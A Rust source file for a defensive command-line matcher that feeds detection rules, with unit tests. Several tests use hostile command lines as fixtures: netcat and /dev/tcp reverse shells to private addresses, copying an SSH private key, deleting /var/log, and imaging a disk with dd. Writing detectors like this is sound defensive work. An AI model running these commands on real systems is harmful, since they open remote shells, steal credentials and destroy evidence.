//! The structured matcher. A [`Matcher`] is a small, hand-authorable predicate
//! over a parsed [`Command`] and its raw line, replacing the three ad-hoc
//! substring fields (`command`/`args_contains`/`raw_contains`) that a
//! knowledge-base entry used to carry. It describes *detectability* only — "what
//! would a defender see?" — and encodes no evasion semantics.
//!
//! ## The three axes
//! - `program` — who ran: an exact basename or an any-of set.
//! - `args`   — a predicate tree over the resolved argument vector.
//! - `line`   — a predicate over the whole raw line (for redirections, pipes,
//!   and markers that span tokens).
//!
//! Leaf predicates such as `word` (word-boundary) and `path_under`
//! (path-segment aware) exist to kill the substring false positives that plain
//! `contains` produced — e.g. `/var/log` matching `cd /var/log`, or `id_rsa`
//! matching `id_rsa_notes.txt`.
//!
//! Legacy entries are lowered into an equivalent `Matcher` at load time (see
//! `KbEntry::compiled_matcher`), so the substring behavior is reproduced exactly
//! and the knowledge bases can migrate incrementally.

use serde::Deserialize;

use crate::parser::Command;

/// A structured predicate matching a parsed command within its raw line.
///
/// All three fields are optional. When `program` is present the matcher is
/// command-scoped: some command in the unit must satisfy `program` (and `args`
/// / `line`, if given). When `program` is absent the matcher is line-scoped: the
/// raw line must satisfy `line`.
#[derive(Debug, Clone, Default, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Matcher {
    #[serde(default)]
    pub program: Option<ProgramMatch>,
    #[serde(default)]
    pub args: Option<ArgPred>,
    #[serde(default)]
    pub line: Option<LinePred>,
}

/// How to match the program basename: exact (a bare string) or any-of a set.
#[derive(Debug, Clone, Deserialize)]
#[serde(untagged)]
pub enum ProgramMatch {
    /// `"program": "curl"` — exact basename, case-insensitive.
    Exact(String),
    /// `"program": { "any": ["nc", "ncat"] }` — any of these basenames.
    AnyOf { any: Vec<String> },
}

/// A predicate over a command's argument vector. Leaf predicates are
/// *existential over the arguments* ("some argument satisfies this"); the
/// `all` / `any` / `not` combinators compose predicates, not arguments.
#[derive(Debug, Clone, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ArgPred {
    /// Every sub-predicate holds.
    All(Vec<ArgPred>),
    /// Some sub-predicate holds.
    Any(Vec<ArgPred>),
    /// The sub-predicate does not hold (e.g. a flag is absent).
    Not(Box<ArgPred>),
    /// Some argument equals this flag token exactly (case-insensitive), e.g. `-e`.
    Flag(String),
    /// Some argument equals this string (case-insensitive).
    Eq(String),
    /// Some argument contains this substring.
    Contains(String),
    /// Some argument starts with this string.
    Prefix(String),
    /// Some argument ends with this string.
    Suffix(String),
    /// Some argument contains this token on word boundaries.
    Word(String),
    /// Some argument is a path equal to, or nested under, this directory
    /// (segment-aware: `/var/log/nginx` is under `/var/log`; `/var/logistics`
    /// is not).
    PathUnder(String),
    /// The argument at a fixed position satisfies a leaf string match.
    At(PosMatch),
    /// A leaf string match against all arguments joined by spaces. The
    /// back-compatible lowering of the legacy `args_contains` field.
    Joined(StrLeaf),
}

/// A positional argument match: the argument at `index` must satisfy `value`.
#[derive(Debug, Clone, Deserialize)]
pub struct PosMatch {
    pub index: usize,
    pub value: StrLeaf,
}

/// A predicate over the whole raw line, for markers that span tokens
/// (redirections, pipes, socket paths).
#[derive(Debug, Clone, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum LinePred {
    All(Vec<LinePred>),
    Any(Vec<LinePred>),
    Not(Box<LinePred>),
    /// The line contains this substring (case-insensitive).
    Contains(String),
    /// The line contains this token on word boundaries.
    Word(String),
    /// The line starts with this string.
    Prefix(String),
    /// The line ends with this string.
    Suffix(String),
}

/// A leaf string match against a single value (used by `at` and `joined`).
#[derive(Debug, Clone, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum StrLeaf {
    Eq(String),
    Contains(String),
    Prefix(String),
    Suffix(String),
    Word(String),
}

// --- matching engine -------------------------------------------------------

impl Matcher {
    /// Evaluate the matcher against a unit's commands and its raw line.
    ///
    /// Returns `None` when the matcher does not apply. Returns `Some(mc)` when it
    /// does, where `mc` is the specific command that matched (for command-scoped
    /// matchers) or the unit's first command (for line-scoped matchers) — the
    /// `matched_command` that downstream coverage/Sigma evaluation keys on.
    pub fn evaluate(&self, commands: &[Command], raw: &str) -> Option<Option<Command>> {
        if self.program.is_some() {
            commands
                .iter()
                .find(|c| self.matches_command(c, raw))
                .cloned()
                .map(Some)
        } else {
            // Line-scoped: a matcher with no program and no line matches nothing,
            // mirroring the legacy raw-only path with an empty `raw_contains`.
            let line = self.line.as_ref()?;
            line.eval(raw).then(|| commands.first().cloned())
        }
    }

    /// Does a single command satisfy every present axis of this matcher?
    fn matches_command(&self, cmd: &Command, raw: &str) -> bool {
        if let Some(p) = &self.program
            && !p.matches(&cmd.program)
        {
            return false;
        }
        if let Some(a) = &self.args
            && !a.eval(&cmd.args)
        {
            return false;
        }
        if let Some(l) = &self.line
            && !l.eval(raw)
        {
            return false;
        }
        true
    }
}

impl ProgramMatch {
    fn matches(&self, program: &str) -> bool {
        match self {
            ProgramMatch::Exact(p) => program.eq_ignore_ascii_case(p),
            ProgramMatch::AnyOf { any } => any.iter().any(|p| program.eq_ignore_ascii_case(p)),
        }
    }
}

impl ArgPred {
    fn eval(&self, args: &[String]) -> bool {
        match self {
            ArgPred::All(v) => v.iter().all(|p| p.eval(args)),
            ArgPred::Any(v) => v.iter().any(|p| p.eval(args)),
            ArgPred::Not(p) => !p.eval(args),
            ArgPred::Flag(f) => args.iter().any(|a| a.eq_ignore_ascii_case(f)),
            ArgPred::Eq(s) => args.iter().any(|a| a.eq_ignore_ascii_case(s)),
            ArgPred::Contains(s) => args.iter().any(|a| contains_ci(a, s)),
            ArgPred::Prefix(s) => args.iter().any(|a| starts_with_ci(a, s)),
            ArgPred::Suffix(s) => args.iter().any(|a| ends_with_ci(a, s)),
            ArgPred::Word(s) => args.iter().any(|a| word_match(a, s)),
            ArgPred::PathUnder(base) => args.iter().any(|a| path_under(a, base)),
            ArgPred::At(pos) => args.get(pos.index).is_some_and(|a| pos.value.eval(a)),
            ArgPred::Joined(leaf) => leaf.eval(&args.join(" ")),
        }
    }
}

impl LinePred {
    fn eval(&self, line: &str) -> bool {
        match self {
            LinePred::All(v) => v.iter().all(|p| p.eval(line)),
            LinePred::Any(v) => v.iter().any(|p| p.eval(line)),
            LinePred::Not(p) => !p.eval(line),
            LinePred::Contains(s) => contains_ci(line, s),
            LinePred::Word(s) => word_match(line, s),
            LinePred::Prefix(s) => starts_with_ci(line, s),
            LinePred::Suffix(s) => ends_with_ci(line, s),
        }
    }
}

impl StrLeaf {
    fn eval(&self, value: &str) -> bool {
        match self {
            StrLeaf::Eq(s) => value.eq_ignore_ascii_case(s),
            StrLeaf::Contains(s) => contains_ci(value, s),
            StrLeaf::Prefix(s) => starts_with_ci(value, s),
            StrLeaf::Suffix(s) => ends_with_ci(value, s),
            StrLeaf::Word(s) => word_match(value, s),
        }
    }
}

// --- leaf helpers ----------------------------------------------------------

fn contains_ci(haystack: &str, needle: &str) -> bool {
    haystack.to_lowercase().contains(&needle.to_lowercase())
}

fn starts_with_ci(haystack: &str, needle: &str) -> bool {
    haystack.to_lowercase().starts_with(&needle.to_lowercase())
}

fn ends_with_ci(haystack: &str, needle: &str) -> bool {
    haystack.to_lowercase().ends_with(&needle.to_lowercase())
}

/// Case-insensitive substring match requiring a non-word character (or the
/// string edge) on both sides. A "word character" is `[A-Za-z0-9_]`. This is
/// what stops `id_rsa` from matching inside `id_rsa_notes.txt`.
fn word_match(haystack: &str, needle: &str) -> bool {
    if needle.is_empty() {
        return false;
    }
    let h = haystack.to_lowercase();
    let n = needle.to_lowercase();
    let hb = h.as_bytes();
    let is_word = |b: u8| b.is_ascii_alphanumeric() || b == b'_';
    let mut from = 0;
    while let Some(rel) = h[from..].find(&n) {
        let i = from + rel;
        let before_ok = i == 0 || !is_word(hb[i - 1]);
        let after = i + n.len();
        let after_ok = after >= hb.len() || !is_word(hb[after]);
        if before_ok && after_ok {
            return true;
        }
        from = i + 1;
    }
    false
}

/// Is `arg`, read as a filesystem path, equal to or nested under `base`? Compares
/// whole path segments (case-insensitive, trailing slashes ignored), so
/// `/var/log/nginx` is under `/var/log` but `/var/logistics` is not.
fn path_under(arg: &str, base: &str) -> bool {
    let a = arg.to_lowercase();
    let b = base.to_lowercase();
    let a = a.trim_end_matches('/');
    let b = b.trim_end_matches('/');
    if b.is_empty() {
        return false;
    }
    a == b || a.starts_with(&format!("{b}/"))
}

// --- representative derivation ---------------------------------------------
//
// Downstream tooling (`verify`, `scaffold`) needs to turn a matcher back into a
// concrete example: a command line that the matcher would match, and the
// CommandLine substrings a mirroring Sigma `selection` should test. Both are
// derived by walking the predicate tree for the literals a match keys on.

impl Matcher {
    /// The literal program basename for an `Image|endswith` scaffold, if the
    /// program is matched exactly. `None` for any-of / line-scoped matchers.
    pub fn program_literal(&self) -> Option<&str> {
        match &self.program {
            Some(ProgramMatch::Exact(p)) => Some(p),
            _ => None,
        }
    }

    /// The substrings a mirroring Sigma `CommandLine` selection should test:
    /// the literals from the `args` and `line` predicates, in that order.
    pub fn commandline_terms(&self) -> Vec<String> {
        let mut terms = Vec::new();
        if let Some(a) = &self.args {
            collect_arg_terms(a, &mut terms);
        }
        if let Some(l) = &self.line {
            collect_line_terms(l, &mut terms);
        }
        terms
    }

    /// A representative command line that this matcher would match, for
    /// synthesizing an example event. Returns `None` when nothing positive can
    /// be derived (e.g. a bare or purely-negated matcher).
    pub fn representative_line(&self) -> Option<String> {
        let mut parts: Vec<String> = Vec::new();
        if let Some(prog) = self.program_representative() {
            parts.push(prog);
        }
        parts.extend(self.commandline_terms());
        let line = parts.join(" ");
        let line = line.trim();
        (!line.is_empty()).then(|| line.to_string())
    }

    /// A representative program basename (exact value, or the first of an
    /// any-of set).
    fn program_representative(&self) -> Option<String> {
        match &self.program {
            Some(ProgramMatch::Exact(p)) => Some(p.clone()),
            Some(ProgramMatch::AnyOf { any }) => any.first().cloned(),
            None => None,
        }
    }
}

/// Collect literals from an argument predicate that a satisfying argument would
/// carry. `any` takes its first branch; `not` contributes nothing.
fn collect_arg_terms(pred: &ArgPred, out: &mut Vec<String>) {
    match pred {
        ArgPred::All(v) => v.iter().for_each(|p| collect_arg_terms(p, out)),
        ArgPred::Any(v) => {
            if let Some(first) = v.first() {
                collect_arg_terms(first, out);
            }
        }
        ArgPred::Not(_) => {}
        ArgPred::Flag(s)
        | ArgPred::Eq(s)
        | ArgPred::Contains(s)
        | ArgPred::Prefix(s)
        | ArgPred::Suffix(s)
        | ArgPred::Word(s)
        | ArgPred::PathUnder(s) => out.push(s.clone()),
        ArgPred::At(pos) => out.push(str_leaf_literal(&pos.value)),
        ArgPred::Joined(leaf) => out.push(str_leaf_literal(leaf)),
    }
}

/// Collect literals from a line predicate.
fn collect_line_terms(pred: &LinePred, out: &mut Vec<String>) {
    match pred {
        LinePred::All(v) => v.iter().for_each(|p| collect_line_terms(p, out)),
        LinePred::Any(v) => {
            if let Some(first) = v.first() {
                collect_line_terms(first, out);
            }
        }
        LinePred::Not(_) => {}
        LinePred::Contains(s) | LinePred::Word(s) | LinePred::Prefix(s) | LinePred::Suffix(s) => {
            out.push(s.clone())
        }
    }
}

fn str_leaf_literal(leaf: &StrLeaf) -> String {
    match leaf {
        StrLeaf::Eq(s)
        | StrLeaf::Contains(s)
        | StrLeaf::Prefix(s)
        | StrLeaf::Suffix(s)
        | StrLeaf::Word(s) => s.clone(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::parser::parse_line;

    fn m(json: &str) -> Matcher {
        serde_json::from_str(json).expect("matcher parses")
    }

    /// Evaluate a matcher against a raw command line the way the analyzer does.
    fn matches(matcher: &Matcher, line: &str) -> bool {
        let commands = parse_line(line);
        matcher.evaluate(&commands, line.trim()).is_some()
    }

    #[test]
    fn program_exact_and_any_of() {
        let exact = m(r#"{ "program": "curl" }"#);
        assert!(matches(&exact, "curl http://x/y"));
        assert!(!matches(&exact, "wget http://x/y"));
        // Case-insensitive and wrapper-stripped (sudo) and path-normalized.
        assert!(matches(&exact, "sudo /usr/bin/CURL http://x"));

        let set = m(r#"{ "program": { "any": ["nc", "ncat"] } }"#);
        assert!(matches(&set, "nc -e /bin/sh 10.0.0.1 4444"));
        assert!(matches(&set, "ncat 10.0.0.1 4444"));
        assert!(!matches(&set, "socat - tcp:10.0.0.1:4444"));
    }

    #[test]
    fn flags_and_alternation() {
        let rev = m(r#"{
            "program": { "any": ["nc", "ncat"] },
            "args": { "all": [
                { "flag": "-e" },
                { "any": [ {"eq": "/bin/sh"}, {"eq": "/bin/bash"} ] }
            ] }
        }"#);
        assert!(matches(&rev, "nc -e /bin/sh 10.0.0.1 4444"));
        assert!(matches(&rev, "ncat -e /bin/bash 1.2.3.4 9001"));
        // Missing -e, or a different shell → no match.
        assert!(!matches(&rev, "nc /bin/sh 10.0.0.1 4444"));
        assert!(!matches(&rev, "nc -e /bin/zsh 10.0.0.1 4444"));
    }

    #[test]
    fn negation_of_a_flag() {
        // "tar creating an archive, but not listing" — contrived, exercises not.
        let pred = m(r#"{ "program": "tar", "args": { "all": [
            { "flag": "-c" }, { "not": { "flag": "-t" } }
        ] } }"#);
        assert!(matches(&pred, "tar -c -f out.tar /etc"));
        assert!(!matches(&pred, "tar -c -t -f out.tar"));
    }

    #[test]
    fn path_under_is_segment_aware() {
        let clear = m(r#"{ "program": "rm", "args": { "path_under": "/var/log" } }"#);
        assert!(matches(&clear, "rm -rf /var/log/nginx"));
        assert!(matches(&clear, "rm -rf /var/log")); // the directory itself
        // Not under /var/log — the substring FP the old matcher had.
        assert!(!matches(&clear, "rm -rf /var/logistics"));
        assert!(!matches(&clear, "cd /var/log && rm -rf target/debug"));
    }

    #[test]
    fn word_boundary_kills_substring_fp() {
        let key = m(r#"{ "line": { "word": "id_rsa" } }"#);
        assert!(matches(&key, "cp ~/.ssh/id_rsa /tmp/k"));
        assert!(matches(&key, "cat id_rsa")); // exact token
        // A different filename that merely contains the token is not a match.
        assert!(!matches(&key, "vim id_rsa_backup_notes.txt"));
    }

    #[test]
    fn positional_argument() {
        let pred = m(r#"{ "program": "dd", "args": {
            "at": { "index": 0, "value": { "prefix": "if=/dev/" } }
        } }"#);
        assert!(matches(&pred, "dd if=/dev/sda of=/tmp/disk.img"));
        assert!(!matches(&pred, "dd of=/tmp/x if=/dev/sda")); // not at index 0
    }

    #[test]
    fn line_predicate_contains() {
        let rev = m(r#"{ "line": { "contains": "/dev/tcp" } }"#);
        assert!(matches(&rev, "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"));
        assert!(!matches(&rev, "echo hello"));
    }

    #[test]
    fn representative_round_trips_through_the_engine() {
        for json in [
            r#"{ "program": "curl" }"#,
            r#"{ "program": "rm", "args": { "path_under": "/var/log" } }"#,
            r#"{ "program": { "any": ["nc", "ncat"] }, "args": { "all": [
                { "flag": "-e" }, { "any": [ {"eq": "/bin/sh"} ] } ] } }"#,
            r#"{ "line": { "contains": "/dev/tcp" } }"#,
            r#"{ "line": { "word": "id_rsa" } }"#,
        ] {
            let matcher = m(json);
            let repr = matcher
                .representative_line()
                .unwrap_or_else(|| panic!("no representative for {json}"));
            assert!(
                matches(&matcher, &repr),
                "representative `{repr}` did not match its own matcher {json}",
            );
        }
    }

    #[test]
    fn commandline_terms_order_args_then_line() {
        let matcher = m(r#"{ "program": "x", "args": { "contains": "aaa" },
                             "line": { "contains": "bbb" } }"#);
        assert_eq!(matcher.commandline_terms(), vec!["aaa", "bbb"]);
        assert_eq!(matcher.program_literal(), Some("x"));
    }

    #[test]
    fn unknown_field_is_rejected() {
        // A typo'd axis must fail loudly rather than silently match nothing.
        let err = serde_json::from_str::<Matcher>(r#"{ "programm": "curl" }"#);
        assert!(err.is_err());
    }
}
